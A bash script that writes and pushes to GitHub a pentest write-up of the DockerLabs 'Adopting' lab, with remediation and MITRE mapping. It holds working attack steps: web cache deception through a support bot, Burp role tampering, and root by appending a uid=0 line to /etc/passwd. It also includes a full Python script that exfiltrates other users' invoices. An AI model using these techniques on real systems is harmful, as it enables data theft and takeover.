#!/usr/bin/env bash
#===============================================================================
#  Adopting-DockerLabsES · Professional Pentest Report Generator & Publisher
#  Author : dani-kl
#  Usage  : bash publish_report.sh
#  Result : Creates the repo structure, writes the report + exploit appendix,
#           commits everything as "dani-kl" and pushes to GitHub.
#===============================================================================
set -euo pipefail

REPO="Adopting-DockerLabsES"
mkdir -p "${REPO}/scripts"

#------------------------------------------------------------------------------
# 1 · WRITE THE MAIN REPORT (Markdown)
#------------------------------------------------------------------------------
cat > "${REPO}/Adopting-dani-kl.md" <<'MD_EOF'
![Author](https://img.shields.io/badge/Author-dani--kl-blue?style=for-the-badge)
![Machine](https://img.shields.io/badge/Machine-Adopting%20(DockerLabs%20ES)-green?style=for-the-badge)
![Main Vector](https://img.shields.io/badge/Main%20Vector-Web%20Cache%20Deception-orange?style=for-the-badge)
![Result](https://img.shields.io/badge/Result-ROOT%20%F0%9F%92%80-red?style=for-the-badge)

# 🐾 Adopting-DockerLabsES — Penetration Test Report & Write-up

> **Author:** `dani-kl` · **Platform:** DockerLabs (ES) · **Target:** `http://172.17.0.2:2300`
> **Engagement type:** Authorized lab assessment (CTF-style, black-box → full compromise)
> **Report date:** 2026-11-14 · **Classification:** Educational / public write-up

---

## 🧭 Index

1. [Executive Summary](#1--executive-summary)
2. [Scope, Methodology & Rules of Engagement](#2--scope-methodology--rules-of-engagement)
3. [Lab Deployment](#3--lab-deployment)
4. [Reconnaissance & Enumeration](#4--reconnaissance--enumeration)
5. [Attack Chain Overview](#5--attack-chain-overview)
6. [Findings & Exploitation](#6--findings--exploitation)
7. [Post-Exploitation & Privilege Escalation](#7--post-exploitation--privilege-escalation)
8. [Findings Summary & Risk Rating](#8--findings-summary--risk-rating)
9. [Remediation & Hardening](#9--remediation--hardening)
10. [MITRE ATT&CK Mapping](#10--mitre-attck-mapping)
11. [Tools & Arsenal](#11--tools--arsenal)
12. [Appendix A — Exploit Code](#12--appendix-a--exploit-code)
13. [Disclaimer](#13--disclaimer)

---

## 1 · Executive Summary

**Adopting** is a containerized web application (animal-adoption platform) exposed on
TCP port **2300**. During a black-box assessment, a chained attack path was identified
that leads from an unauthenticated position to **full system compromise (root)**:

1. **Information disclosure** during account registration (user IDs + session token).
2. **Web Cache Deception (WCD)** triggered through the support-ticket bot: customer
   invoices (PDF) of *other* users were exfiltrated from the reverse-cache layer.
3. **Broken authorization** based on a client-modifiable `role` attribute: intercepting
   and rewriting the authentication response (`"role":"user"` → `"role":"admin"`)
   unlocked the hidden **Operations Panel** (`/admin`).
4. A **second Web Cache Deception** against the server-side protected resource
   `/internal/credentials-report.pdf` disclosed **administrative credentials**.
5. With a leaked credential (`pingu`), SSH access was obtained. A **world-writable
   `/etc/passwd`** allowed injecting a new `uid=0` account → **root**.

The most critical root causes are: (a) a cache layer that keys objects on the *literal*
URI and therefore caches authenticated content as if it were static, and (b)
authorization decisions delegated to client-visible data.

---

## 2 · Scope, Methodology & Rules of Engagement

| Item            | Detail                                                            |
|-----------------|-------------------------------------------------------------------|
| Target          | `http://172.17.0.2:2300` (Docker lab network, isolated)           |
| Methodology     | PTES lifecycle + OWASP WSTG + OWASP Top 10 (2021) mapping         |
| Approach        | Black-box → authenticated → post-exploitation                     |
| Out of scope    | DoS, physical attacks, any host outside the lab network           |
| Evidence        | All steps reproducible with the commands and script included here |

---

## 3 · Lab Deployment

```bash
unzip adopting.zip                 # extract the lab bundle
bash ./auto_deploy.sh adopting.tar # build & boot the vulnerable container
```

The deployment script instantiates the Docker container and publishes the application
on port `2300/tcp`.

---

## 4 · Reconnaissance & Enumeration

### 4.1 Network scanning

```bash
nmap -p- --open -sS -sV -n -Pn 172.17.0.2
```

```text
PORT     STATE SERVICE VERSION
2300/tcp open  http    Adopting web application (registration + login panel)
```

A single attack surface: the web application. All further effort was therefore focused
on the HTTP layer.

### 4.2 Content & endpoint discovery

* **`dirb`** against the web root returned 3 paths, none of them functional — a dead end
  that justified moving to authenticated mapping.
* **Burp Suite** passive/active mapping after registration revealed the API namespace:
  `/api/auth/login`, `/api/auth/me`, `/cart/`, `/account/invoices/<ID>.pdf`,
  `/api/support/tickets`, `/support`, `/admin`, `/internal/credentials-report.pdf`.
* **`gobuster`** was then used to brute-force the API tree:

```bash
gobuster dir -u http://172.17.0.2:2300/api \
       -w /usr/share/wordlists/seclists/Discovery/Web-Content/api-wordlist.txt \
       -t 50 -x json --no-error
```

### 4.3 Business-logic mapping

| Function | Behaviour observed |
|----------|--------------------|
| Registration | Returns user `id`, session token (`hb_token`) and reveals the existence of 5 pre-existing account IDs |
| Adoption cart | Adding an animal and accepting generates a **PDF invoice** per operation |
| Invoice viewer | `/account/invoices/<ID>.pdf` — ID visible in URL (IDOR candidate) |
| Help center | Ticket creation accepts a `screenshot_url` that is **visited by an privileged bot/admin** |

---

## 5 · Attack Chain Overview

```text
[Registration] ──▶ info disclosure (user IDs, token)
       │
       ▼
[Error oracle] ──▶ enumerate valid invoice IDs (1000–1019)
       │
       ▼
[Support ticket bot] ──(admin session)──▶ crafted URL  /…/1019.pdf;user.pdf
       │                                          │
       │                                          ▼
       │                                reverse cache stores AUTHED body
       ▼                                          │
[Attacker GET same URL] ◀────── cache HIT ────────┘   ⇒ customer PII (invoices)
       │
       ▼
[Burp match-&-replace] "role":"user" → "role":"admin" ⇒ hidden /admin panel
       │
       ▼
[WCD round 2] /internal/credentials-report.pdf;user.pdf ⇒ admin credentials PDF
       │
       ▼
[SSH pingu] → writable /etc/passwd → openssl hash → uid=0 ⇒ ROOT 💀
```

---

## 6 · Findings & Exploitation

### VULN-01 · Information disclosure on registration (Low)

The registration response leaks internal user IDs (1–5) and a session token structure.
This provides the enumeration basis for later object-reference attacks.

```json
{ "id": 6, "email": "dani@kl.io", "token": "hb_token=eyJhbGciOi…", "existing_ids": [1,2,3,4,5] }
```

### VULN-02 · IDOR/BOLA test on invoices — *controlled* (Negative result)

Direct manipulation of the invoice ID was tested:

* Unauthenticated → `{"error":"authentication required"}` / `{"error":"invoice not found"}`
* Authenticated as a different user → `{"error":"forbidden"}` / `{"error":"bad invoice id"}`

Server-side ownership enforcement is **correct**. However, the error differential acts
as an **existence oracle** (used in Phase 1 of the exploit), and — critically — the
cache layer sitting in front of this control can be abused (VULN-03).

### VULN-03 · Web Cache Deception → exfiltration of customer invoices (High)

**Concept.** The reverse cache treats any URI *ending in a static-looking extension*
(e.g. `.pdf`) as cacheable static content, while the backend router normalizes the path
(stripping the `;user.pdf` path-parameter suffix) and executes the **dynamic,
authenticated** invoice handler. The authenticated response body is therefore stored in
cache under a "static" key and later served to **unauthenticated** requesters.

**Trigger.** The help-center bot (authenticated as admin) is fed the crafted URL through
a support ticket:

```text
GET /account/invoices/1019.pdf;user.pdf
```

On the second request to the same URI, the cached private PDF is returned to the
attacker. The full automation (ID enumeration → login → ticket → cache warm-up →
download → `file` verification) is provided in **Appendix A**
(`scripts/cache_deception_exploit.py`, original author: **Pyth0nK1d**).

**Impact:** confidentiality breach of multiple customers' billing data (PII).

### VULN-04 · Broken authorization via client-modifiable `role` attribute (High)

The SPA gates its administrative UI on the `role` field returned by
`/api/auth/login` and `/api/auth/me` — i.e. **authorization enforced on client-visible
data**. Using Burp Suite as an intercepting proxy:

1. Scope limited to the target:
   `Settings › Project › Scope › Target Scope › Add › http://172.17.0.2:2300`
2. HTTP match-and-replace rule:
   `Settings › Tools › Proxy › HTTP match and replace rules › Add`

   | Field   | Value                          |
   |---------|--------------------------------|
   | Type    | Response body                  |
   | Match   | `"role":"user"`                |
   | Replace | `"role":"admin"`               |

After login, the dashboard renders a previously hidden **Operations Panel** (`/admin`)
exposing an internal resource. Note the defence-in-depth inconsistency:
`/internal/credentials-report.pdf` *does* enforce authorization server-side
(`{"error":"admin required"}`), proving the role check itself is sound — only its
client-side delegation is broken.

### VULN-05 · Web Cache Deception on internal resource → admin credentials (Critical)

Response headers confirm the protected document participates in the cache:

```text
GET /internal/credentials-report.pdf
X-Cache: MISS
X-Cache-Key: /internal/credentials-report.pdf
```

Repeating the ticket-bot trick caches the admin-authenticated document:

```text
Support ticket → screenshot_url:
http://localhost:2300/internal/credentials-report.pdf;user.pdf
```

Once the bot warms the cache, the file is retrievable without any privilege:

```bash
curl -s 'http://172.17.0.2:2300/internal/credentials-report.pdf' -o credentials-report.pdf
file credentials-report.pdf
# credentials-report.pdf: PDF document, version 1.3, 2 page(s)
```

The document contains **reserved administrative credentials**.

---

## 7 · Post-Exploitation & Privilege Escalation

### 7.1 Initial foothold (SSH)

Testing every leaked credential against SSH yields a valid account: **`pingu`**.

```bash
ssh pingu@172.17.0.2
```

### 7.2 Local enumeration — misconfigured `/etc/passwd`

```bash
ls -la /etc/passwd
# -rw-rw-rw- 1 root pingu … /etc/passwd   ← writable by our user (should be 644 root:root)
```

Although modern Linux stores hashes in `/etc/shadow`, `/etc/passwd` still **defines
accounts** (user, uid, gid, home, shell). Write access to it is a total privilege
boundary failure.

### 7.3 Root via account injection

```bash
openssl passwd -6 -salt 'dani' 'Sup3rSecret!'      # SHA-512 crypt hash
echo 'dani:$6$dani$<HASH>:0:0::/root:/bin/bash' >> /etc/passwd
tail -n 1 /etc/passwd                              # verify the rewrite persisted
su - dani                                          # authenticate as the injected account
id                                                 # uid=0(root) gid=0(root) groups=0(root)
```

**Result: full root compromise of the container.** 👑

---

## 8 · Findings Summary & Risk Rating

| ID      | Finding                                    | CWE     | OWASP Top 10 (2021)   | Severity |
|---------|--------------------------------------------|---------|------------------------|----------|
| VULN-01 | User/token disclosure on registration      | CWE-200 | A01 Broken Access Ctrl | Low      |
| VULN-02 | IDOR/BOLA on invoices                      | CWE-639 | A01 Broken Access Ctrl | *Controlled* |
| VULN-03 | Web Cache Deception → invoice exfiltration | CWE-444 | A05 Security Misconf.  | High     |
| VULN-04 | Client-side role enforcement (authz bypass)| CWE-862 | A01 Broken Access Ctrl | High     |
| VULN-05 | WCD on internal resource → admin creds     | CWE-444 | A05 Security Misconf.  | Critical |
| VULN-06 | World-writable `/etc/passwd` → root        | CWE-732 | A05 Security Misconf.  | Critical |

---

## 9 · Remediation & Hardening

* **Cache layer:** never cache responses belonging to authenticated sessions; key cache
  objects on the *normalized* path (reject `;`, encoded separators and double
  extensions); send `Vary: Cookie, Authorization`; set `Cache-Control: no-store` on all
  dynamic endpoints.
* **Authorization:** enforce role/permission checks **server-side, per request**, from
  session-bound server state — never from JSON attributes delivered to the client.
* **Support bot:** sandbox outbound fetches; strip session cookies or use a dedicated
  low-privilege identity; disable shared caching for bot-triggered requests; validate
  `screenshot_url` against an allow-list.
* **Filesystem hygiene:** `/etc/passwd` must be `root:root 644`; add integrity monitoring
  (e.g. AIDE) and enforce least privilege inside containers.
* **Credential hygiene:** rotate every credential present in the credentials report.
* **Keep the good:** server-side ownership checks on invoices (VULN-02) are a positive
  control — preserve them while fixing the cache behaviour that undermines them.

---

## 10 · MITRE ATT&CK Mapping

| Technique | Name                              | Usage in this engagement            |
|-----------|-----------------------------------|-------------------------------------|
| T1595     | Active Scanning                   | nmap / dirb / gobuster enumeration  |
| T1190     | Exploit Public-Facing Application | Web Cache Deception (VULN-03/05)    |
| T1552     | Unsecured Credentials             | credentials-report.pdf exposure     |
| T1078     | Valid Accounts                    | SSH login with leaked credential    |
| T1136.001 | Create Account: Local Account     | Injected uid=0 entry in /etc/passwd |
| T1548     | Abuse Elevation Control Mechanism | Local privilege escalation to root  |

---

## 11 · Tools & Arsenal

`nmap` · `dirb` · `gobuster` · `Burp Suite (Proxy, Repeater, Match-&-Replace)` ·
`curl` · `python3 (requests)` · `openssl` · `file`

---

## 12 · Appendix A — Exploit Code

The automated Web Cache Deception exfiltration tool used in VULN-03
(original author: **Pyth0nK1d**) is maintained in this repository at:

📄 [`scripts/cache_deception_exploit.py`](scripts/cache_deception_exploit.py)

---

## 13 · Disclaimer

This assessment was performed exclusively against an intentionally vulnerable,
isolated laboratory environment (DockerLabs). All techniques are documented for
**educational purposes**. Unauthorized testing of systems you do not own is illegal.

---

**© 2026 · dani-kl** — [github.com/dani-kl](https://github.com/dani-kl)
*"Break the cache, own the box — responsibly."*
MD_EOF

#------------------------------------------------------------------------------
# 2 · WRITE THE EXPLOIT APPENDIX (Python)
#------------------------------------------------------------------------------
cat > "${REPO}/scripts/cache_deception_exploit.py" <<'PY_EOF'
#!/usr/bin/env python3
"""cache_deception_exploit.py — Web Cache Deception exfiltration helper.
Original author: Pyth0nK1d · Documented in: Adopting-dani-kl.md (VULN-03)
Phases: 1) invoice-ID oracle enumeration  2) login  3) ticket -> cache warm -> download
"""
import requests, time, subprocess, sys
from pathlib import Path

BASE_URL   = "http://172.17.0.2:2300"   # <-- change to your target
START_ID, END_ID = 1000, 1019
EMAIL, PASSWORD  = "<TU CORREO>", "<TU CONTRASEÑA>"

def check_invoice_exists(session, invoice_id):
    """Unauthenticated existence oracle:
    'authentication required' -> exists | 'invoice not found' -> missing."""
    url = f"{BASE_URL}/account/invoices/{invoice_id}.pdf"
    try:
        r = session.get(url, timeout=10)
        try:
            data = r.json()
            if data.get("error") == "authentication required":
                print(f"  [✓] ID {invoice_id}: EXISTS");  return True
            if data.get("error") == "invoice not found":
                print(f"  [✗] ID {invoice_id}: missing"); return False
            print(f"  [?] ID {invoice_id}: unexpected - {data}"); return False
        except ValueError:
            if r.status_code == 200:
                print(f"  [✓] ID {invoice_id}: EXISTS (binary)"); return True
            print(f"  [✗] ID {invoice_id}: status {r.status_code}"); return False
    except requests.exceptions.RequestException as e:
        print(f"  [!] ID {invoice_id}: connection error - {e}"); return False

def login(session):
    """Authenticate and capture the hb_token cookie."""
    r = session.post(f"{BASE_URL}/api/auth/login",
                     json={"email": EMAIL, "password": PASSWORD}, timeout=10)
    if "hb_token" in session.cookies:
        tok = session.cookies["hb_token"]
        print(f"[✓] Login OK. Token: {tok[:20]}..."); return tok
    print("[✗] hb_token cookie not found"); return None

def create_support_ticket(session, invoice_id):
    """Feed the admin bot a cache-deception URL so it warms the cache."""
    payload = {
        "subject": "Precio incorrecto",
        "message": "He detectado un precio incorrecto en mi factura. Revisarlo, por favor.",
        "screenshot_url": f"http://localhost:2300/account/invoices/{invoice_id}.pdf;Pyth0nK1d.pdf",
    }
    r = session.post(f"{BASE_URL}/api/support/tickets", json=payload, timeout=10)
    ok = r.status_code in (200, 201)
    print(f"[{'✓' if ok else '✗'}] Ticket for invoice {invoice_id} -> {r.status_code}")
    return ok

def download_invoice(session, invoice_id):
    """Retrieve the cached (private) PDF without privileges."""
    url = f"{BASE_URL}/account/invoices/{invoice_id}.pdf;Pyth0nK1d.pdf"
    fname = f"{invoice_id}.pdf"
    r = session.get(url, timeout=30, stream=True)
    if r.status_code == 200:
        with open(fname, "wb") as f:
            for chunk in r.iter_content(8192):
                if chunk: f.write(chunk)
        print(f"[✓] Downloaded {fname}"); return fname
    print(f"[✗] Download failed ({r.status_code})"); return None

def verify_file(filename):
    if not Path(filename).exists():
        return False
    try:
        out = subprocess.run(["file", filename], capture_output=True, text=True, check=True)
        print(f"[✓] {out.stdout.strip()}"); return True
    except subprocess.CalledProcessError:
        return False
    except FileNotFoundError:
        print("[!] 'file' not found, skipping verification"); return True

def main():
    print("=" * 75)
    print("WEB CACHE DECEPTION — INVOICE EXFILTRATION · by Pyth0nK1d")
    print("=" * 75)
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.0"})

    print(f"\n[+] PHASE 1: invoice oracle scan ({START_ID}-{END_ID})")
    existing = [i for i in range(START_ID, END_ID + 1) if check_invoice_exists(session, i)]
    print(f"    Existing invoices: {existing}")
    if not existing:
        print("[!] No invoices found. Exiting."); return

    print("\n[+] PHASE 2: authentication")
    if not login(session):
        print("[!] Login failed. Exiting."); return

    print("\n[+] PHASE 3: cache warm-up + exfiltration")
    for n, inv in enumerate(existing, 1):
        print(f"\n--- {n}/{len(existing)} · invoice {inv} ---")
        if not create_support_ticket(session, inv):
            continue
        print("[*] Waiting 10 s for the admin bot to warm the cache...")
        time.sleep(10)
        fname = download_invoice(session, inv)
        if fname:
            verify_file(fname)
        if n < len(existing):
            time.sleep(1)

    files = sorted((f for f in Path(".").glob("*.pdf") if f.stem.isdigit()),
                   key=lambda x: int(x.stem))
    print(f"\n[+] DONE · {len(files)} PDF(s) exfiltrated:")
    for f in files:
        print(f"    - {f.name} ({f.stat().st_size} bytes)")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user."); sys.exit(1)
    except Exception as e:
        print(f"[!] Unexpected error: {e}"); sys.exit(1)
PY_EOF

#------------------------------------------------------------------------------
# 3 · GIT INIT + COMMIT + PUSH AS dani-kl
#------------------------------------------------------------------------------
cd "${REPO}"
git init -b main
git add -A
git -c user.name="dani-kl" \
    -c user.email="dani-kl@users.noreply.github.com" \
    commit -m "docs(adopting): professional pentest report — web cache deception → root | author: dani-kl"

# Point this to your own repository before pushing:
git remote add origin https://github.com/dani-kl/Adopting-DockerLabsES.git
git push -u origin main

echo "[✓] Report published as dani-kl → https://github.com/dani-kl/Adopting-DockerLabsES"
